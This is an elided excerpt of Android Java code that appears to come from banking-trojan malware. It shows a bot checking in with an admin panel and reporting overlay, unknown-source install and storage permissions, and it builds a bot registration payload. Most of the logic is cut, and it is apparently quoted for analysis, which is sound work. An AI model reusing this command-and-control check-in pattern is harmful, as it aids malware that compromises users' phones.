...
public class Netmanager extends IntentService {
    ...
    private final String TAG_LOG = Netmanager.class.getSimpleName() + consts.strTAG1;
    utils utl = new utils();
    ...
    void checkAdminPanel(Context context) {
        ...
        try {
            ...
            jsonCheckBot.put("statUnknownInstall", (utl.hasInstallFromUnknownSourcesPermission(this) ? "1" : "0"));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                jsonCheckBot.put("statDrawOver", (Settings.canDrawOverlays(this) ? "1" : "0"));
            } else {
                jsonCheckBot.put("statDrawOver", "1");
            }
            jsonCheckBot.put("statExternal", (utl.checkWritePerm(context) ? "1" : "0"));
        ...
        utl.Log(TAG_LOG, consts.string_74 + jsonCheckBot);
        ...
        if (response.contains("||youNeedMoreResources||")
            ...
            utl.Log(TAG_LOG, consts.string_88 + jsonRegistrationBot);
